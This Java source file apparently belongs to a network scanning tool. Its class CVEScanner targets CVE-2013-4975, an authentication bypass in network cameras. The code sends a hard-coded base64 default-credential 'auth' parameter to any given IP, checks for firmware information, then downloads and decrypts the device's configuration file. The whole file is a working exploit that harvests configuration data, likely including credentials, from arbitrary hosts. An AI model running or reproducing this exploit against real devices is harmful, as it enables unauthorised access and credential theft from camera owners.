package scanner.cve;

import okhttp3.Response;
import okhttp3.ResponseBody;
import scanner.http.HttpClient;

import java.io.IOException;
import java.util.Objects;
import java.util.Optional;

/**
 * Basic CVE scanning class.
 *
 * @author inkarnadin
 */
@Deprecated
public class CVEScanner {

    private static final String CVE_2013_4975 = "http://%s/system/deviceInfo?auth=YWRtaW46MTIzNDU=";
    private static final String CONFIG_FILE = "http://%s/System/configurationFile?auth=YWRtaW46MTIzNDU=";

    /**
     * Checks target address for vulnerability to CVE-2013-4975.
     *
     * @param ip target IP address.
     * @return result of cve scanning
     */
    public static Optional<String> scanning(String ip) {
        try (Response response = HttpClient.doGet(String.format(CVE_2013_4975, ip))) {
            ResponseBody responseBody = response.body();
            if (Objects.nonNull(responseBody)) {
                String body = responseBody.string();
                if (body.contains("firmwareVersion")) {
                    try (Response configFile = HttpClient.doGet(String.format(CONFIG_FILE, ip))) {
                        ResponseBody configFileBody = configFile.body();
                        return (Objects.nonNull(configFileBody))
                                ? ConfigurationDecrypt.decrypt(configFileBody.byteStream())
                                : Optional.empty();
                    }
                }
            }
        } catch (IOException ignored) {}
        return Optional.empty();
    }

}